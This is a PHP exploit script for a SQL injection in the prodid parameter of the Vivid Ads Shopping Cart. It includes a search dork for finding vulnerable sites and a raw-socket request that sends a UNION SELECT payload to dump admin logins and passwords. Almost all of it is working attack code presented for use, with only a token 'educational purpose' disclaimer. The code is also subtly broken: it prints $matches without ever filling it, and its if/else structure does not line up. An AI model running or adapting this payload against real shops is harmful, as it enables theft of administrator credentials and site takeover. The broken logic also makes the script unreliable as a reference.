Vivid Ads Shopping Cart (prodid) Remote SQL Injection
=====================================================

<?php
# Vivid Ads Shopping Cart (prodid) Remote SQL Injection
# Author: Pr0T3cT10n, pr0t3ct10n[at]gmail[dot]com
# This code was written for educational purpose. Use it at your own risk.
# Author will be not responsible for any damage.
# Dork: "Vivid Ads Shopping Cart"
# nullbyte.org.il
 
$site = &#039;www.example.com&#039;; # Site address
$path = &#039;/path&#039;; # Folder path
$contents = &#039;&#039;;
$sock = fsockopen($site, 80, $errno, $errstr, 30);
if(!$sock){
    echo(&#039;( &#039; .$errstr.$errno. &#039; )&#039;."\n");
}
else{
    $pack = "GET " .$path. "/detail.php?prodid=-1+union+select+1,2,3,concat(char(60),login,char(59),password,char(62)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19+from+admin HTTP/1.1\r\n";
    $pack.= "Host: " .$site. "\r\n";
    $pack.= "Connection: Close\r\n\r\n";
    if(fwrite($sock, $pack)){
        while(!feof($sock)){
            $contents.= fgets($sock, 4096);
        }
            echo(&#039;User: &#039; .$matches[1]. &#039;;&#039;."\n".&#039;Pass: &#039; .$matches[2]. &#039;;&#039;."\n".&#039;Admin login: http://&#039; .$site.$path. &#039;/admin/&#039;."\n");
        }
        else{
            echo(&#039;Can\&#039;t pull out admin details.&#039;."\n");
        }
    }
    else{
        echo(&#039;Can\&#039;t write socket.&#039;."\n");
    }
}
?>


